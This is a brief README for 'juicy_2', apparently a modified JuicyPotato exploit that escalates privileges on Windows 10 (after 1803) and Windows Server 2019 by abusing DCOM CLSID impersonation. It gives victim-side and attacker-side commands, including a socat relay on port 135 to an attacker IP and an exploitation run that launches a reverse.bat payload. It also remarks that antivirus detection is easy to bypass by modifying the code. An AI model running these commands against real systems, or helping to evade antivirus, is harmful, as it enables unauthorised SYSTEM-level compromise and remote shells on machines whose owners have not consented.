# juicy_2
juicypotato for win10 > 1803 &amp; win server 2019<br>
<b>Disclaimer:</b><br>
This is just a quick & dirty modification of our JuicyPotato in order to test valid CLSID's an to impersonate (YOU NEED IMPERSONATION PRIVILEGES)them for newer windows 10 and windows server 2019 platforms.<br>
(I know, this version is catched by Defender and other AV's, but with some modifications in code it's easy to bypass)
<hr>

Mandatory requisite is to have the possibility to reidirect traffic for port 135 on a forwarder machine under you control.<br>
Feel free to improve the code, I was too lazy for this kind of stuff. <br>
<hr>
<i><b>For testing CLSID:</i></b><br>
juicy_2 -z -x [ip] of socat listener  -l [fake oxid resolver port] -n [local RPC server port] -c [CLSID] to test:<br>
Example:<br>
  on victim:<br>
  juicy_2 -z -x 192.168.1.1 -l 9995 -n 9998 -c {90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}<br>
  on attacker (192.168.1.1): <br>
  socat -v  TCP-LISTEN:135,fork,reuseaddr TCP:<victim machine>:9995 
<br>
  <i><b>For exploitation:</i></b><br>
  on victim:<br>
  juicy_2 -x 192.168.1.1 -l 9995 -n 9998 -c {90F18417-F0F1-484E-9D3C-59DCEEE5DBD8} -t * -p c:\temp\reverse.bat<br>
  on attacker (192.168.1.1): <br>
  socat -v  TCP-LISTEN:135,fork,reuseaddr TCP:<victim machine>:9995<br>
  
